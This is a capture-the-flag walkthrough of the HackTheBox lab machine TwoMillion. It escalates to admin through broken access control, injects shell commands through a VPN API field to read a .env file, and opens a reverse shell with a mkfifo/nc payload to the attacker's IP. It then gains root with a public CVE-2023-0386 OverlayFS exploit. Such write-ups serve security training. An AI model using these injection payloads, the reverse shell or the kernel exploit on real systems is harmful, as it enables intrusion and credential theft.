10:T3a9a,<p><strong>Difficulty:</strong> Easy<br><strong>OS:</strong> Linux<br><strong>IP:</strong> 10.129.41.177<br><strong>My Kali IP (tun0):</strong> 10.10.16.187  </p>
<hr>
<h2 id="overview">Overview</h2>
<p>TwoMillion is a Linux machine themed around the old HackTheBox website. The attack chain involves:</p>
<ol>
<li>Reverse engineering obfuscated JavaScript to generate an invite code</li>
<li>Registering an account and abusing an API to escalate to admin</li>
<li>Exploiting a command injection vulnerability in an admin API endpoint</li>
<li>Reading a <code>.env</code> file to get SSH credentials (user flag)</li>
<li>Exploiting <strong>CVE-2023-0386</strong> (OverlayFS kernel vulnerability) to get root</li>
</ol>
<hr>
<h2 id="step-1-reconnaissance">Step 1: Reconnaissance</h2>

<p>Before attacking anything, we need to know what ports and services are running on the target. Nmap is the common tool for this.</p>
<pre><code class="language-bash" data-language="bash">nmap -sV -sC -oN nmap.txt 10.129.41.177
</code></pre>
<p><strong>Flags explained:</strong></p>
<ul>
<li><code>-sV</code> → detect service versions</li>
<li><code>-sC</code> → run default scripts (banner grab, etc.)</li>
<li><code>-oN</code> → save output to file</li>
</ul>
<p><strong>Result:</strong> Two open ports:</p>
<ul>
<li><strong>Port 22</strong> → SSH (OpenSSH)</li>
<li><strong>Port 80</strong> → HTTP (Nginx web server)</li>
</ul>
<hr>
<h2 id="step-2-add-hostname-to-etc-hosts">Step 2: Add Hostname to /etc/hosts</h2>

<p>The web server redirects to <code>2million.htb</code> - a hostname. Without telling our machine what IP that hostname points to, our browser won't resolve it. We add it manually to <code>/etc/hosts</code> (Linux's local DNS file).</p>
<pre><code class="language-bash" data-language="bash">echo "10.129.41.177 2million.htb" | sudo tee -a /etc/hosts
</code></pre>
<p>Now browse to: <code>http://2million.htb</code></p>
<p>You'll see the <strong>old HackTheBox homepage</strong> (circa 2017).</p>
<hr>
<h2 id="step-3-getting-an-invite-code">Step 3: Getting an Invite Code</h2>

<p>The site has a <code>/invite</code> page that requires a valid invite code to register. We need to reverse engineer how this code is generated.</p>
<h3 id="3a-find-the-javascript-file">3a: Find the JavaScript File</h3>
<p>Open browser DevTools (F12) → Network tab → Refresh the <code>/invite</code> page.<br>You'll spot a JS file called <strong><code>inviteapi.min.js</code></strong> being loaded.</p>
<h3 id="3b-deobfuscate-the-javascript">3b: Deobfuscate the JavaScript</h3>
<p>The JS is obfuscated (minified + encoded). Opening it reveals a function called <code>makeInviteCode()</code>.<br>Paste the code into a deobfuscator like <a href="https://lelinhtinh.github.io/de4js/" target="_blank" rel="nofollow noopener noreferrer">https://lelinhtinh.github.io/de4js/<span class="sr-only"> opens in a new tab</span></a> to read it clearly.</p>
<p>The deobfuscated code shows it makes a <strong>POST request</strong> to <code>/api/v1/invite/how/to/generate</code> to get a hint.</p>
<h3 id="3c-get-the-hint">3c: Get the Hint</h3>
<pre><code class="language-bash" data-language="bash">curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq .
</code></pre>
<p><strong>Output:</strong></p>
<pre><code class="language-json" data-language="json">{
  "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
  "enctype": "ROT13"
}
</code></pre>
<p>The message is ROT13 encoded. Decoded it says:<br><em>"In order to generate the invite code, make a POST request to /api/v1/invite/generate"</em></p>
<h3 id="3d-generate-the-invite-code">3d: Generate the Invite Code</h3>
<pre><code class="language-bash" data-language="bash">curl -s -X POST http://2million.htb/api/v1/invite/generate | jq .
</code></pre>
<p><strong>Output:</strong></p>
<pre><code class="language-json" data-language="json">{
  "data": {
    "code": "TkE0WEItVkdMRTAtMEJLMjUtMFBKMVE=",
    "format": "encoded"
  }
}
</code></pre>
<p>The code is <strong>Base64 encoded</strong>. Decode it:</p>
<pre><code class="language-bash" data-language="bash">echo "TkE0WEItVkdMRTAtMEJLMjUtMFBKMVE=" | base64 -d
# Output: NA4XB-VGLE0-0BK25-0PJ1Q
</code></pre>

<h2 id="step-4-register-and-login">Step 4: Register and Login</h2>

<p>We need a valid account to explore the application's authenticated features and find the admin API.</p>
<ol>
<li>Go to <code>http://2million.htb/invite</code></li>
<li>Enter the decoded invite code</li>
<li>Fill in the registration form (any email/username/password)</li>
<li>Login with your credentials</li>
</ol>
<blockquote>
<p> <strong>Important:</strong> Do this in the <strong>browser</strong> - the app sets session cookies during browser-based registration that don't work correctly through raw API calls.</p>
</blockquote>
<hr>
<h2 id="step-5-grab-your-session-cookie">Step 5: Grab Your Session Cookie</h2>

<p>All authenticated API requests need our session cookie (PHPSESSID) to prove we're logged in. This is how PHP web apps track sessions.</p>
<p>After logging in:</p>
<ul>
<li>Press <strong>F12</strong> → <strong>Storage</strong> tab → <strong>Cookies</strong> → <code>http://2million.htb</code></li>
<li>Copy the <strong>PHPSESSID</strong> value</li>
</ul>
<pre><code class="language-bash" data-language="bash">export SID="your_phpsessid_here"
</code></pre>

<pre><code class="language-bash" data-language="bash">curl -s http://2million.htb/api/v1 --cookie "PHPSESSID=$SID" | jq .
</code></pre>

<h2 id="step-7-privilege-escalation-to-admin">Step 7: Privilege Escalation to Admin</h2>

<p>Normal users can't access admin endpoints. But the <code>/api/v1/admin/settings/update</code> endpoint doesn't properly validate authorization - it lets any authenticated user set <code>is_admin: 1</code> on their own account. This is a <strong>broken access control</strong> vulnerability (OWASP A01).</p>
<pre><code class="language-bash" data-language="bash">curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
  --cookie "PHPSESSID=$SID" \
  -H "Content-Type: application/json" \
  -d '{"email":"your@email.com","is_admin":1}' | jq .
</code></pre>
<p><strong>Expected response:</strong></p>
<pre><code class="language-json" data-language="json">{
  "id": 13,
  "username": "youruser",
  "is_admin": 1
}
</code></pre>
<p>We are now admin.</p>
<hr>
<h2 id="step-8-command-injection-via-admin-vpn-endpoint">Step 8: Command Injection via Admin VPN Endpoint</h2>

<p>The <code>/api/v1/admin/vpn/generate</code> endpoint takes a <code>username</code> parameter and uses it inside a shell command to generate VPN configs (likely calling <code>ovpn</code> tools). It doesn't sanitize the input - so we can inject our own shell commands. This is a <strong>command injection</strong> vulnerability (OWASP A03).</p>
<h3 id="8a-dump-env-file-directly">8a: Dump .env File Directly</h3>
<p>Before getting a reverse shell, we can read sensitive files directly:</p>
<pre><code class="language-bash" data-language="bash">curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  --cookie "PHPSESSID=$SID" \
  -H "Content-Type: application/json" \
  -d '{"username":"test;cat /var/www/html/.env;"}'
</code></pre>
<p><strong>Output:</strong>
DB_HOST=127.0.0.1<br>DB_DATABASE=htb_prod<br>DB_USERNAME=admin<br>DB_PASSWORD=SuperDuperPass123</p>
<p>The <code>.env</code> file (environment variables file used by PHP/Laravel apps) contains <strong>database credentials</strong> - and since sysadmins often reuse passwords, we try these for SSH.</p>
<h3 id="8b-get-a-reverse-shell-optional">8b: Get a Reverse Shell (Optional)</h3>
<pre><code class="language-bash" data-language="bash"># Terminal 1 - Listener
nc -lvnp 4444

# Terminal 2 - Inject shell
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  --cookie "PHPSESSID=$SID" \
  -H "Content-Type: application/json" \
  -d '{"username":"test;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.16.187 4444 &gt;/tmp/f #"}'
</code></pre>
<p><strong>Shell payload explained:</strong></p>
<ul>
<li><code>rm /tmp/f</code> → clean up any old pipe</li>
<li><code>mkfifo /tmp/f</code> → create a named pipe (FIFO) for bidirectional communication</li>
<li><code>cat /tmp/f | /bin/bash -i</code> → feed commands from pipe into bash interactively</li>
<li><code>2&gt;&amp;1</code> → redirect stderr to stdout so we see errors too</li>
<li><code>| nc 10.10.16.187 4444 &gt;/tmp/f</code> → send output to our listener and write responses back to pipe</li>
</ul>

<p>We found credentials in <code>.env</code>. SSH gives us a stable, full TTY session - much better than a reverse shell.</p>
<pre><code class="language-bash" data-language="bash">ssh admin@10.129.41.177
# Password: REDACTED
</code></pre>
<pre><code class="language-bash" data-language="bash">cat ~/user.txt
# ddb95e[redacted]e133ab773
</code></pre>
<p> <strong>User flag captured!</strong></p>

<h2 id="step-10-enumeration-for-privilege-escalation">Step 10: Enumeration for Privilege Escalation</h2>

<p>We're logged in as <code>admin</code> (a regular user). We need to find a way to become <code>root</code>. Check for hints left by the box creator.</p>
<pre><code class="language-bash" data-language="bash">cat /var/mail/admin
</code></pre>
<p>There's an email from <code>ch4p@2million.htb</code> mentioning a recent <strong>OverlayFS vulnerability</strong> being actively exploited. This hints at <strong>CVE-2023-0386</strong>.</p>
<hr>
<h2 id="step-11-root-via-cve-2023-0386-overlayfs">Step 11: Root via CVE-2023-0386 (OverlayFS)</h2>
<h3 id="what-is-cve-2023-0386">What is CVE-2023-0386?</h3>
<p>OverlayFS is a Linux filesystem feature that layers directories on top of each other (used heavily by Docker). A flaw was found in how the kernel copies files between overlay layers - it <strong>fails to check if the user owns the file</strong> when copying from a <code>lower</code> directory to an <code>upper</code> directory. This allows an unprivileged user to smuggle a <strong>SUID binary</strong> (a file that runs as root) into a location and execute it to get root access. [web:50]</p>
<p><strong>Affected kernels:</strong> Linux 5.11 up to ~6.1.9<br><strong>Disclosed:</strong> March 2023</p>
<h3 id="11a-download-exploit-on-kali">11a: Download Exploit on Kali</h3>
<pre><code class="language-bash" data-language="bash">git clone https://github.com/xkaneiki/CVE-2023-0386
zip -r /tmp/cve.zip CVE-2023-0386
</code></pre>
<h3 id="11b-transfer-to-target">11b: Transfer to Target</h3>
<pre><code class="language-bash" data-language="bash">scp /tmp/cve.zip admin@10.129.41.177:/tmp/
# Password: REDACTED
</code></pre>
<h3 id="11c-compile-on-target">11c: Compile on Target</h3>
<pre><code class="language-bash" data-language="bash"># SSH into target
cd /tmp
unzip cve.zip -d CVE-2023-0386
cd CVE-2023-0386
make all
</code></pre>
<blockquote>
<p> You'll see warnings about format strings and clock skew - these are <strong>harmless</strong>. As long as <code>fuse</code>, <code>exp</code>, and <code>gc</code> binaries are created, you're good.</p>
</blockquote>
<h3 id="11d-run-the-exploit-two-terminals-required">11d: Run the Exploit (Two Terminals Required)</h3>
<p>The exploit needs two simultaneous processes:</p>
<ul>
<li><strong>Process 1 (<code>./fuse</code>)</strong> → mounts a fake OverlayFS and serves a SUID binary from the lower layer</li>
<li><strong>Process 2 (<code>./exp</code>)</strong> → triggers the kernel to copy the SUID binary while bypassing ownership checks</li>
</ul>
<p><strong>SSH Terminal 1</strong> (leave running):</p>
<pre><code class="language-bash" data-language="bash">cd /tmp/CVE-2023-0386
./fuse ./ovlcap/lower ./gc
# This will appear to hang - that's correct!
</code></pre>
<p><strong>SSH Terminal 2</strong> (open new SSH session):</p>
<pre><code class="language-bash" data-language="bash">ssh admin@10.129.41.177
cd /tmp/CVE-2023-0386
./exp
</code></pre>
<p><strong>Expected output:</strong>
uid:1000 gid:1000<br>[+] mount success<br>-rwsrwxrwx 1 nobody nogroup 16096 Jan 1 1970 file<br>[+] exploit success!<br>root@2million:/tmp/CVE-2023-0386#</p>
<h3 id="11e-root-flag">11e: Root Flag</h3>
<pre><code class="language-bash" data-language="bash">id
# uid=0(root) gid=0(root) groups=0(root),1000(admin)

cat /root/root.txt
# cdecd[redacted]0223f171
</code></pre>
<p> <strong>Root flag captured!</strong></p>

<h2 id="review-notes">Review notes</h2>

<li><strong>Do not store plaintext credentials</strong> in <code>.env</code> files accessible from the web root</li>
